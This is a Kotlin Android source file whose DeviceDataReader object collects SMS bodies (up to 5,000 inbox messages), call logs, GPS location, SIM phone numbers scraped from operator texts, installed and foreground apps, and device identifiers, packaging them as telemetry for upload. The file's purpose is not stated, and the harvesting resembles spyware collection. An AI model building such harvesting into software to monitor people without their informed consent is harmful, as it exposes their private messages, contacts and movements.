package com.example.gmaagent.data

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import com.example.gmaagent.network.AppInfo
import com.example.gmaagent.network.CallEntry
import com.example.gmaagent.network.CommunicationLogEntry
import com.example.gmaagent.network.DeviceTelemetryRequest
import com.example.gmaagent.network.SmsEntry
import java.net.Inet4Address
import java.net.NetworkInterface
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

/**
 * Reads SMS messages and call logs from the device's ContentProviders.
 * Requires READ_SMS and READ_CALL_LOG permissions.
 */
object DeviceDataReader {

    private const val TAG = "DeviceDataReader"
    private const val MAX_RECORDS = 200  // Cap per sync to avoid payload bloat

    private val isoFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US).apply {
        timeZone = TimeZone.getTimeZone("UTC")
    }

    // ── SMS Reading ──────────────────────────────────────────

    /**
     * Reads the most recent SMS messages from the device.
     * @param context Application context
     * @param sinceTimestamp Only fetch messages newer than this epoch millis (0 = all)
     * @return List of [SmsEntry] ready for upload
     */
    fun readSmsLogs(context: Context, sinceTimestamp: Long = 0): List<SmsEntry> {
        val smsList = mutableListOf<SmsEntry>()
        var cursor: Cursor? = null

        try {
            val selection = if (sinceTimestamp > 0) "${Telephony.Sms.DATE} > ?" else null
            val selectionArgs = if (sinceTimestamp > 0) arrayOf(sinceTimestamp.toString()) else null

            cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.DATE,
                    Telephony.Sms.READ,
                ),
                selection,
                selectionArgs,
                "${Telephony.Sms.DATE} DESC",
            )

            cursor?.let {
                val addressIdx = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val typeIdx = it.getColumnIndexOrThrow(Telephony.Sms.TYPE)
                val dateIdx = it.getColumnIndexOrThrow(Telephony.Sms.DATE)
                val readIdx = it.getColumnIndexOrThrow(Telephony.Sms.READ)

                var count = 0
                while (it.moveToNext() && count < MAX_RECORDS) {
                    val address = it.getString(addressIdx) ?: "unknown"
                    val body = it.getString(bodyIdx)
                    val type = mapSmsType(it.getInt(typeIdx))
                    val date = it.getLong(dateIdx)
                    val read = it.getInt(readIdx) == 1

                    smsList.add(
                        SmsEntry(
                            address = address,
                            body = body,
                            sms_type = type,
                            timestamp = isoFormat.format(Date(date)),
                            read = read,
                        )
                    )
                    count++
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "SMS permission not granted", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error reading SMS", e)
        } finally {
            cursor?.close()
        }

        Log.i(TAG, "Read ${smsList.size} SMS messages")
        return smsList
    }

    private fun mapSmsType(type: Int): String = when (type) {
        Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
        Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
        Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
        else -> "inbox"
    }

    // ── Call Log Reading ─────────────────────────────────────

    /**
     * Reads the most recent call log entries from the device.
     * @param context Application context
     * @param sinceTimestamp Only fetch calls newer than this epoch millis (0 = all)
     * @return List of [CallEntry] ready for upload
     */
    fun readCallLogs(context: Context, sinceTimestamp: Long = 0): List<CallEntry> {
        val callList = mutableListOf<CallEntry>()
        var cursor: Cursor? = null

        try {
            val selection = if (sinceTimestamp > 0) "${CallLog.Calls.DATE} > ?" else null
            val selectionArgs = if (sinceTimestamp > 0) arrayOf(sinceTimestamp.toString()) else null

            cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE,
                    CallLog.Calls.CACHED_NAME,
                ),
                selection,
                selectionArgs,
                "${CallLog.Calls.DATE} DESC",
            )

            cursor?.let {
                val numberIdx = it.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                val durationIdx = it.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                val dateIdx = it.getColumnIndexOrThrow(CallLog.Calls.DATE)
                val nameIdx = it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)

                var count = 0
                while (it.moveToNext() && count < MAX_RECORDS) {
                    val number = it.getString(numberIdx) ?: "unknown"
                    val type = mapCallType(it.getInt(typeIdx))
                    val duration = it.getInt(durationIdx)
                    val date = it.getLong(dateIdx)
                    val name = it.getString(nameIdx)

                    callList.add(
                        CallEntry(
                            phone_number = number,
                            call_type = type,
                            duration_seconds = duration,
                            timestamp = isoFormat.format(Date(date)),
                            contact_name = name,
                        )
                    )
                    count++
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "Call Log permission not granted", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error reading Call Log", e)
        } finally {
            cursor?.close()
        }

        Log.i(TAG, "Read ${callList.size} call log entries")
        return callList
    }

    private fun mapCallType(type: Int): String = when (type) {
        CallLog.Calls.INCOMING_TYPE -> "incoming"
        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
        CallLog.Calls.MISSED_TYPE -> "missed"
        CallLog.Calls.REJECTED_TYPE -> "rejected"
        else -> "incoming"
    }

    // ── Communication Logs — Full Inbox History ─────────────

    private const val MAX_HISTORY_RECORDS = 5000  // Higher cap for full history sync

    /**
     * Reads ALL received (inbox) SMS messages from the device.
     * Unlike [readSmsLogs], this fetches the complete inbox history
     * with no timestamp filter, returning [CommunicationLogEntry]
     * objects containing only the sender address, message body,
     * and original timestamp.
     *
     * @param context Application context
     * @return List of [CommunicationLogEntry] ready for bulk upload
     */
    fun readInboxSmsHistory(context: Context): List<CommunicationLogEntry> {
        val logsList = mutableListOf<CommunicationLogEntry>()
        var cursor: Cursor? = null

        try {
            // Only fetch inbox (received) messages
            val selection = "${Telephony.Sms.TYPE} = ?"
            val selectionArgs = arrayOf(Telephony.Sms.MESSAGE_TYPE_INBOX.toString())

            cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE,
                ),
                selection,
                selectionArgs,
                "${Telephony.Sms.DATE} DESC",
            )

            cursor?.let {
                val addressIdx = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
                val bodyIdx = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                val dateIdx = it.getColumnIndexOrThrow(Telephony.Sms.DATE)

                var count = 0
                while (it.moveToNext() && count < MAX_HISTORY_RECORDS) {
                    val address = it.getString(addressIdx) ?: "unknown"
                    val body = it.getString(bodyIdx)
                    val date = it.getLong(dateIdx)

                    logsList.add(
                        CommunicationLogEntry(
                            address = address,
                            body = body,
                            timestamp = isoFormat.format(Date(date)),
                        )
                    )
                    count++
                }
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "SMS permission not granted for inbox history", e)
        } catch (e: Exception) {
            Log.e(TAG, "Error reading SMS inbox history", e)
        } finally {
            cursor?.close()
        }

        Log.i(TAG, "Read ${logsList.size} inbox SMS for Communication Logs")
        return logsList
    }

    // ── Device Diagnostics ───────────────────────────────────

    fun getBatteryLevel(context: Context): Int {
        return try {
            val filter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
            val batteryStatus = context.registerReceiver(null, filter)
            val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
            if (level >= 0 && scale > 0) {
                ((level.toFloat() / scale.toFloat()) * 100).toInt()
            } else {
                -1
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading battery level", e)
            -1
        }
    }

    fun getStorageDiagnostics(): Pair<Float, Float> {
        return try {
            val path = Environment.getDataDirectory()
            val stat = StatFs(path.path)
            val blockSize = stat.blockSizeLong
            val totalBlocks = stat.blockCountLong
            val availableBlocks = stat.availableBlocksLong

            val totalBytes = totalBlocks * blockSize
            val availableBytes = availableBlocks * blockSize

            val bytesInGb = 1024f * 1024f * 1024f
            val totalGb = String.format(Locale.US, "%.1f", totalBytes / bytesInGb).toFloat()
            val availableGb = String.format(Locale.US, "%.1f", availableBytes / bytesInGb).toFloat()

            Pair(availableGb, totalGb)
        } catch (e: Exception) {
            Log.e(TAG, "Error reading storage", e)
            Pair(0f, 0f)
        }
    }

    fun getRamTotalGb(context: Context): Float {
        return try {
            val actManager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val memInfo = ActivityManager.MemoryInfo()
            actManager.getMemoryInfo(memInfo)
            val bytesInGb = 1024f * 1024f * 1024f
            String.format(Locale.US, "%.1f", memInfo.totalMem / bytesInGb).toFloat()
        } catch (e: Exception) {
            Log.e(TAG, "Error reading RAM", e)
            0f
        }
    }

    fun getHardwareSerialNumber(): String {
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    Build.getSerial()
                } catch (e: SecurityException) {
                    "${Build.MANUFACTURER}-${Build.MODEL}"
                }
            } else {
                @Suppress("DEPRECATION")
                Build.SERIAL ?: "${Build.MANUFACTURER}-${Build.MODEL}"
            }
        } catch (e: Exception) {
            "${Build.MANUFACTURER}-${Build.MODEL}"
        }
    }

    // ── Geolocation Services ─────────────────────────────────

    fun getGeolocation(context: Context): Pair<Double, Double>? {
        return try {
            val locManager = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
                ?: return null

            var bestLocation: Location? = null

            // Check GPS provider
            if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                if (locManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    val gpsLoc = locManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    if (gpsLoc != null) bestLocation = gpsLoc
                }
            }

            // Check Network provider if GPS was null
            if (bestLocation == null && ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                if (locManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    val netLoc = locManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                    if (netLoc != null) bestLocation = netLoc
                }
            }

            bestLocation?.let {
                Pair(it.latitude, it.longitude)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading GPS location", e)
            null
        }
    }

    // ── Network Intelligence ─────────────────────────────────

    fun getNetworkIntelligence(context: Context): Pair<String, String> {
        var ipAddress = "127.0.0.1"
        var networkType = "Unknown"

        try {
            // Find IP address
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val iface = interfaces.nextElement()
                val addresses = iface.inetAddresses
                while (addresses.hasMoreElements()) {
                    val addr = addresses.nextElement()
                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
                        ipAddress = addr.hostAddress ?: ipAddress
                        break
                    }
                }
            }

            // Find Network Type
            val connManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val activeNetwork = connManager.activeNetwork
            val capabilities = connManager.getNetworkCapabilities(activeNetwork)

            if (capabilities != null) {
                networkType = when {
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Cellular (5G/LTE)"
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
                    else -> "Connected"
                }
            } else {
                networkType = "Offline"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading network intel", e)
        }

        return Pair(ipAddress, networkType)
    }

    // ── App Management ───────────────────────────────────────

    fun getInstalledApps(context: Context): List<AppInfo> {
        val apps = mutableListOf<AppInfo>()
        try {
            val pm = context.packageManager
            val packages = pm.getInstalledPackages(PackageManager.GET_META_DATA)

            for (pkg in packages) {
                // Ignore self
                if (pkg.packageName == context.packageName) continue

                val isSystem = (pkg.applicationInfo?.flags ?: 0) and ApplicationInfo.FLAG_SYSTEM != 0
                val appName = pkg.applicationInfo?.loadLabel(pm)?.toString() ?: pkg.packageName
                val version = pkg.versionName ?: "1.0"

                apps.add(
                    AppInfo(
                        name = appName,
                        `package` = pkg.packageName,
                        version = version,
                        is_system = isSystem,
                    )
                )
            }
            // Sort user apps first, then alphabetically
            apps.sortBy { it.name.lowercase() }
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching installed apps", e)
        }
        return apps
    }

    // ── SIM & Telephony Intelligence ──────────────────────────

    fun getSimDetails(context: Context): Triple<String?, String?, String?> {
        var sim1: String? = null
        var sim2: String? = null
        var primaryPhone: String? = null

        try {
            val hasPhonePerm = ContextCompat.checkSelfPermission(
                context,
                android.Manifest.permission.READ_PHONE_STATE
            ) == PackageManager.PERMISSION_GRANTED

            if (hasPhonePerm) {
                val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val subs = subManager?.activeSubscriptionInfoList

                if (!subs.isNullOrEmpty()) {
                    for (sub in subs) {
                        val slot = sub.simSlotIndex // 0 or 1
                        val carrier = sub.carrierName?.toString()?.trim()
                            ?: sub.displayName?.toString()?.trim()
                            ?: "Cellular"

                        var num: String? = null
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            try {
                                num = subManager.getPhoneNumber(sub.subscriptionId)
                            } catch (_: Exception) {}
                        }
                        if (num.isNullOrBlank()) {
                            @Suppress("DEPRECATION")
                            num = sub.number
                        }

                        val cleanNum = num?.takeIf { it.isNotBlank() && it != "unknown" }
                        val formatted = if (cleanNum != null) "$cleanNum $carrier" else carrier

                        if (slot == 0) {
                            sim1 = formatted
                            if (cleanNum != null && primaryPhone == null) primaryPhone = cleanNum
                        } else if (slot == 1) {
                            sim2 = formatted
                            if (cleanNum != null && primaryPhone == null) primaryPhone = cleanNum
                        }
                    }
                }

                // If number was not on SIM (common in Indian SIMs), check TelephonyManager.line1Number
                if (primaryPhone.isNullOrBlank()) {
                    val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                    try {
                        @Suppress("DEPRECATION")
                        val line1 = telephonyManager?.line1Number
                        if (!line1.isNullOrBlank() && line1 != "unknown") {
                            primaryPhone = line1
                            if (sim1 == null) sim1 = line1
                        }
                    } catch (_: Exception) {}
                }
            }

            // Auto-detect phone number from operator SMS (Jio, Airtel, Vi, BSNL) if still missing
            if (primaryPhone.isNullOrBlank()) {
                val detected = extractNumberFromOperatorSms(context)
                if (!detected.isNullOrBlank()) {
                    primaryPhone = detected
                    if (sim1 != null) {
                        sim1 = "$detected $sim1"
                    } else {
                        sim1 = detected
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error detecting SIM details", e)
        }

        return Triple(sim1, sim2, primaryPhone)
    }

    private fun extractNumberFromOperatorSms(context: Context): String? {
        var cursor: Cursor? = null
        try {
            cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
                null,
                null,
                "${Telephony.Sms.DATE} DESC",
            )
            val regex = Regex("""(?:number|mobile|no\.?|sim|recharge\s+for|for)\s*[:\-]?\s*(?:\+?91)?[ -]?([6-9]\d{9})\b""", RegexOption.IGNORE_CASE)
            var count = 0
            cursor?.let {
                val bodyIdx = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
                while (it.moveToNext() && count < 60) {
                    val body = it.getString(bodyIdx) ?: ""
                    val match = regex.find(body)
                    if (match != null) {
                        val num = match.groupValues[1]
                        if (num.length == 10) {
                            return "+91 $num"
                        }
                    }
                    count++
                }
            }
        } catch (_: Exception) {
        } finally {
            cursor?.close()
        }
        return null
    }

    // ── Combined Telemetry Fetcher ───────────────────────────

    fun collectTelemetry(context: Context, includeApps: Boolean = false): DeviceTelemetryRequest {
        val battery = getBatteryLevel(context)
        val (storageAvail, storageTotal) = getStorageDiagnostics()
        val ram = getRamTotalGb(context)
        val serial = getHardwareSerialNumber()
        val location = getGeolocation(context)
        val (ip, netType) = getNetworkIntelligence(context)
        val apps = if (includeApps) getInstalledApps(context) else null
        val (sim1, sim2, phoneNum) = getSimDetails(context)
        val (fgApp, fgPkg) = getForegroundApp(context)
        val signalStr = getSignalStrength(context)
        val latency = getNetworkLatency()

        return DeviceTelemetryRequest(
            battery_level = if (battery >= 0) battery else null,
            storage_available_gb = if (storageAvail > 0) storageAvail else null,
            storage_total_gb = if (storageTotal > 0) storageTotal else null,
            ram_total_gb = if (ram > 0) ram else null,
            serial_number = serial,
            latitude = location?.first,
            longitude = location?.second,
            ip_address = ip,
            network_type = netType,
            installed_apps = apps,
            phone_number = phoneNum,
            sim_1 = sim1,
            sim_2 = sim2,
            foreground_app = fgApp,
            foreground_app_package = fgPkg,
            signal_strength = signalStr,
            network_latency_ms = latency,
        )
    }

    // ── Foreground App Detection ─────────────────────────────

    /**
     * Returns the currently active foreground app name and package name.
     * Requires PACKAGE_USAGE_STATS permission (granted via Settings > Usage Access).
     */
    fun getForegroundApp(context: Context): Pair<String?, String?> {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager
                    ?: return Pair(null, null)
                val now = System.currentTimeMillis()
                val stats = usm.queryUsageStats(
                    android.app.usage.UsageStatsManager.INTERVAL_DAILY,
                    now - 30_000L, // last 30 seconds
                    now
                )
                if (stats.isNullOrEmpty()) return Pair(null, null)

                val recentApp = stats.maxByOrNull { it.lastTimeUsed }
                if (recentApp != null && recentApp.lastTimeUsed > now - 30_000L) {
                    val pkg = recentApp.packageName
                    val appName = try {
                        val pm = context.packageManager
                        val appInfo = pm.getApplicationInfo(pkg, 0)
                        pm.getApplicationLabel(appInfo).toString()
                    } catch (e: Exception) {
                        pkg
                    }
                    return Pair(appName, pkg)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error getting foreground app", e)
        }
        return Pair(null, null)
    }

    // ── Signal Strength ──────────────────────────────────────

    /**
     * Returns the current cellular signal strength in dBm.
     */
    fun getSignalStrength(context: Context): Int? {
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
                ?: return null
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                val signalStrength = tm.signalStrength
                if (signalStrength != null) {
                    val level = signalStrength.level // 0-4
                    return level
                }
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "Missing permission for signal strength: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "Error getting signal strength", e)
        }
        return null
    }

    // ── Network Latency ──────────────────────────────────────

    /**
     * Measures network round-trip latency by pinging a reliable host.
     * Returns latency in milliseconds, or null if unreachable.
     */
    fun getNetworkLatency(): Int? {
        return try {
            val start = System.currentTimeMillis()
            val process = Runtime.getRuntime().exec("/system/bin/ping -c 1 -W 3 8.8.8.8")
            val exitCode = process.waitFor()
            val elapsed = (System.currentTimeMillis() - start).toInt()
            if (exitCode == 0) elapsed else null
        } catch (e: Exception) {
            Log.e(TAG, "Error measuring network latency", e)
            null
        }
    }
}
